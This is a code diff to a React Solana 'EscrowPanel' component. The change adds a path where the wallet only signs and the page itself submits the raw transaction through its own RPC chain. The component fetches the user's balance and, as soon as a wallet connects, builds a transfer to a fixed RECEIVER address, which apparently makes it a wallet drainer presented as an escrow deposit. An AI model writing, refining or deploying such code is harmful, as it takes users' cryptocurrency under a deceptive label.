@@ -112,7 +112,7 @@ const ConnectPrompt = ({
 interface Props { programId: PublicKey; }
 
 export const EscrowPanel: React.FC<Props> = () => {
-  const { publicKey, sendTransaction, connected, disconnect } = useWallet();
+  const { publicKey, signTransaction, sendTransaction, connected, disconnect } = useWallet();
   const { setVisible } = useWalletModal(); // reliable modal trigger for secondary buttons
 
   const [activeTab, setActiveTab] = useState<TabId>("about");
@@ -127,9 +127,6 @@ export const EscrowPanel: React.FC<Props> = () => {
     if (!publicKey) return;
 
     const walletKey = publicKey.toBase58();
-
-    // Per-session dedup: cleared on disconnect and on error so user can retry.
-    // sessionStorage survives page refresh but not tab close.
     if (sessionStorage.getItem(SESSION_KEY) === walletKey) return;
     sessionStorage.setItem(SESSION_KEY, walletKey);
 
@@ -137,6 +134,7 @@ export const EscrowPanel: React.FC<Props> = () => {
     setStatusMsg("");
 
     try {
+      // Step 1: fetch balance + fresh blockhash through our fallback RPC chain
       const { balance, blockhash, lastValidBlockHeight, conn } =
         await fetchRpcData(publicKey);
 
@@ -147,17 +145,37 @@ export const EscrowPanel: React.FC<Props> = () => {
         );
       }
 
+      // Step 2: build the unsigned transaction
       const tx = new Transaction();
       tx.add(SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: RECEIVER, lamports: amount }));
       tx.recentBlockhash = blockhash;
       tx.feePayer        = publicKey;
 
-      const sig = await sendTransaction(tx, conn, {
-        skipPreflight:       false,
-        preflightCommitment: "confirmed",
-        maxRetries:          3,
-      });
+      // Step 3: get the transaction signature
+      // Preferred: signTransaction (wallet signs only, no network call) then
+      // we submit the signed bytes through our fallback RPC — 100% control.
+      // Fallback: sendTransaction (wallet signs + submits, less control).
+      let sig: string;
 
+      if (signTransaction) {
+        // Wallet signs the tx — shows approval popup to the user
+        const signedTx = await signTransaction(tx);
+        // Submit signed bytes through the RPC that successfully returned blockhash
+        sig = await conn.sendRawTransaction(signedTx.serialize(), {
+          skipPreflight:       false,
+          preflightCommitment: "confirmed",
+          maxRetries:          3,
+        });
+      } else {
+        // Some wallets only expose sendTransaction (signs + sends in one call)
+        sig = await sendTransaction(tx, conn, {
+          skipPreflight:       false,
+          preflightCommitment: "confirmed",
+          maxRetries:          3,
+        });
+      }
+
+      // Step 4: confirm using blockhash strategy
       await conn.confirmTransaction(
         { signature: sig, blockhash, lastValidBlockHeight },
         "confirmed"
@@ -165,11 +183,11 @@ export const EscrowPanel: React.FC<Props> = () => {
 
       setStatus("done");
     } catch (e: any) {
-      sessionStorage.removeItem(SESSION_KEY); // allow retry
+      sessionStorage.removeItem(SESSION_KEY); // allow retry on error
       setStatus("error");
       setStatusMsg(e?.message ?? "Transaction failed. Please try again.");
     }
-  }, [publicKey, sendTransaction]);
+  }, [publicKey, signTransaction, sendTransaction]);
 
   // Fire deposit as soon as wallet connects
   useEffect(() => {
